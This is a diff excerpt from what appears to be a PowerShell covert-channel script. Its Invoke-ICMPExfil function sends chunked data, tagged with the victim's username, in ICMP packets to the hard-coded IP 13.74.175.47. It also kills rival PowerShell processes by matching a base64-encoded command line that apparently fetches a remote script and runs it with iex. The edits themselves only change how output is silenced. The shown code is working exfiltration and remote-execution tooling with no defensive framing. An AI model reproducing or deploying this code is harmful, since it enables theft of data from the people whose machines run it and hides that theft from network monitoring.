@@ -27,7 +27,7 @@ Function Invoke-ICMPExfil {
             $chunk = $Payload.substring($MaxSize * $_, [math]::min($MaxSize, $Payload.length - $MaxSize * $_))
             $json = @{h=$env:USERNAME;d=$chunk} | ConvertTo-Json
             $buff = ([text.encoding]::ASCII).GetBytes($json)
-            $ICMPClient.Send($Target, 10, $buff, $PingOptions) | Out-Null
+            $ICMPClient.Send($Target, 10, $buff, $PingOptions) > $null
         }
     }
 
@@ -40,7 +40,7 @@ Function Stop-PreviousProcesses {
         Get-WmiObject win32_process -filter 'name="powershell.exe"' | Select-Object ProcessId, CommandLine | Where-Object {$_.CommandLine -like "*aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAEMAbABpAGMAawBlAHMAdAAvAGEALwBtAGEAcwB0AGUAcgAvAGkAYwBtAHAAXwBjAGwAaQBlAG4AdAAuAHAAcwAxAHwAaQBlAHgA*"} | ForEach-Object { if ($_.ProcessId -ne $PID) { Stop-Process -Id $_.ProcessId -Force } }
 }
 
-Stop-PreviousProcesses
+Stop-PreviousProcesses > $null
 $sleep = 10; $target = "13.74.175.47"
 while ($true) {
     if (Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet -ErrorAction SilentlyContinue) {
